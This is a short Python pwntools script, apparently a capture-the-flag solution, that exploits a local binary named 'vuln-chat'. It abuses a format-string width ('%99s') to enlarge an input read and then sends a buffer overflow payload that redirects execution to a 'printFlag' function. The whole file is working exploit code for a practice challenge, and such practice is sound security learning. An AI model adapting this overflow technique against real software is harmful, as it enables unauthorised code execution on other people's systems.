from pwn import *

context.log_level = 'debug'

target = process('./vuln-chat')

elf = ELF('./vuln-chat')

#print_flag_addr = p32(0x0804856b)
print_flag_addr = p32(elf.symbols['printFlag'])

target.recvuntil("username: ")

payload0 = b''
payload0 += b'A'*20 # until fmt string
payload0 += b'%99s'

target.sendline(payload0)

target.recvuntil("you?")

payload1 = b''
payload1 += b'B'*49
payload1 += print_flag_addr

target.sendline(payload1)

target.interactive()
